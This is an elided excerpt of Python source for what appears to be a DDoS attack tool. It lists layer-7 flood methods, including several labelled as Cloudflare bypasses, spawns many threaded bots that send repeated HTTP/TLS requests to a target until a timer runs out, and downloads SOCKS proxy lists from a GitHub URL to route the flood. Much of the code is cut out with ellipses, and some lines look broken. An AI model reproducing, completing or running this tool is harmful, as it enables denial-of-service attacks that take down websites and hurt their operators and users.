...
l7 = ["CFB","GET","NULL","POST","OVH","HEAD","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","BYPASS","BYPASSV2","CFBV2","HTTP_BETA","CFUAM","BROWSERENGINE","MIX","NULLHEAD"]
...
def start_attack(method, threads, event, socks_type):
    ...
    try:
        if method == "post":
            ...
            for _ in range(threads):
                threading.Thread(target=BOT, args=(self,event, socks_type), daemon=True).start()
    except:
        pass
...
def Headers(method):
    ...
    elif method == "null" or method == "cfuam" or method == "bypass" or method == "nullhead":
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                ctx.maximum_version(TLSVersion=1.3)
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                cfscrape.create_scraper(sess=session)
                s = ctx.wrap_socket(s, server_hostname=target,do_handshake_on_connect=True)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT1/FortniBloxYT1/main/newsocks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
